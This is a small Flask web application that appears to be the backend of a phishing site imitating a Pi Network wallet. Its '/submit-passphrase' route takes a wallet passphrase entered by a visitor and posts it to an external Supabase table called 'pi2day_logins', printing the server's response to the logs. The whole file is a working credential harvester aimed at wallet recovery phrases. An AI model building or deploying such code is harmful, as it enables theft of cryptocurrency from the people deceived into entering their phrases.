from flask import Flask, render_template, request, jsonify
import os
import requests

app = Flask(__name__)

# ✅ Load Supabase credentials from environment variables
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")

@app.route('/')
def homepage():
    return render_template('homepage.html')

@app.route('/wallet-pinet')
def wallet():
    return render_template('wallet_pinet.html')

@app.route('/submit-passphrase', methods=['POST'])
def submit_passphrase():
    phrase = request.form.get('passphrase')
    if not phrase:
        return jsonify({"error": "No passphrase"}), 400

    headers = {
        "apikey": SUPABASE_KEY,
        "Authorization": f"Bearer {SUPABASE_KEY}",
        "Content-Type": "application/json"
    }

    data = {
        "phrase": phrase
    }

    response = requests.post(
        f"{SUPABASE_URL}/rest/v1/pi2day_logins",
        headers=headers,
        json=data
    )

    # ✅ DEBUG: Print response to Render logs
    print("Supabase response:", response.status_code, response.text)

    if response.status_code == 201:
        return jsonify({"success": True})
    else:
        return jsonify({
            "success": False,
            "status_code": response.status_code,
            "message": response.text
        })

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
